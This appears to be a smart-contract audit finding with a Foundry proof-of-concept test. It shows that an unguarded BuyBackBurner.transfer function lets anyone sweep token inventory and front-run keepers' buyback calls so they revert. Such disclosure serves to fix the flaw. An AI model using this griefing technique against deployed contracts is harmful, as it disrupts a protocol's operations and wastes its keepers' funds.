  "body": "## Summary\n`BuyBackBurner.transfer(address token)` can be called by anyone and transfers the entire balance of token held by the buyback contract:\n- if `token == olas` → sends all OLAS to `bridge2Burner`\n- else → sends all of token to `treasury`\nSince `buyBack(secondToken, ...)` requires the contract to hold `secondToken` inventory and reverts on zero balance, an attacker can front-run/race and sweep inventory immediately before a keeper’s buyback, causing the keeper tx to revert with `ZeroValue()`.\n## Root cause\nNo access control on a privileged “sweep” function:\n```solidity\nfunction transfer(address token) external {\n    uint256 tokenAmount = IERC20(token).balanceOf(address(this));\n    if (tokenAmount == 0) revert ZeroValue();\n\n    if (token == olas) {\n        IERC20(olas).transfer(bridge2Burner, tokenAmount);\n    } else {\n        IERC20(token).transfer(treasury, tokenAmount);\n    }\n    emit TokenTransferred(to, tokenAmount);\n}\n```\nAnd `buyBack` reverts when there is no inventory:\n```solidity\nuint256 balance = IERC20(localSecondToken).balanceOf(address(this));\nif (secondTokenAmount == 0 || secondTokenAmount > balance) { secondTokenAmount = balance; }\nif (secondTokenAmount == 0) { revert ZeroValue(); }\n```\n## Impact\n- Reliable griefing of buyback operations (keepers waste gas; buybacks delayed/blocked).\n- Forces routing of non-OLAS inventory to treasury, potentially preventing intended “inventory → buy OLAS → bridge2Burner” cadence.",
  "proof_of_concept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\n\nimport \"../contracts/utils/BuyBackBurner.sol\"; // brings `ZeroValue` error selector into scope\nimport {BuyBackBurnerUniswap} from \"../contracts/utils/BuyBackBurnerUniswap.sol\";\n\nimport {ERC20Token} from \"../contracts/test/ERC20Token.sol\";\n\ncontract PoC_BuyBackBurner is Test {\n    function test_PoC_BuyBackBurner_PermissionlessTransfer_CanGriefBuyBack() public {\n        // Use the repo's standard test token used across the suite (acts as OLAS / secondToken in this PoC).\n        ERC20Token secondToken = new ERC20Token();\n        ERC20Token olas = new ERC20Token();\n\n        address bridge2Burner = address(0xB0B);\n        address treasury = address(0x1337);\n        BuyBackBurnerUniswap burner = new BuyBackBurnerUniswap(address(0x1), bridge2Burner, treasury, address(0x3));\n\n        // Owner initializes burner (oracle/router addresses can be dummies for this PoC).\n        // The core point: `transfer(secondToken)` is permissionless and can drain the entire inventory.\n        address[] memory accounts = new address[](4);\n        accounts[0] = address(olas);\n        accounts[1] = address(secondToken);\n        accounts[2] = address(0xCAFE); // oracle (unused in this grief PoC)\n        accounts[3] = address(0xBEEF); // router (unused in this grief PoC)\n        burner.initialize(abi.encode(accounts, uint256(50)));\n\n        // Protocol inventory arrives (e.g., from fees / operations)\n        secondToken.mint(address(burner), 100 ether);\n        assertEq(secondToken.balanceOf(address(burner)), 100 ether);\n\n        // Sanity: without sweeping, `buyBack(secondToken, 0)` proceeds past the \"zero inventory\" check.\n        // It reverts later because we did not configure a V2 oracle (expected for this focused PoC).\n        vm.expectRevert(bytes(\"Zero oracle address\"));\n        burner.buyBack(address(secondToken), 0);\n\n        // Any third party can front-run / grief by sweeping the inventory to the treasury.\n        vm.prank(address(0xBAD));\n        burner.transfer(address(secondToken));\n\n        assertEq(secondToken.balanceOf(address(burner)), 0);\n        assertEq(secondToken.balanceOf(treasury), 100 ether);\n\n        // Keeper/user buyback now fails earlier because inventory is gone.\n        vm.expectRevert(ZeroValue.selector);\n        burner.buyBack(address(secondToken), 0);\n    }\n\n}\n```",
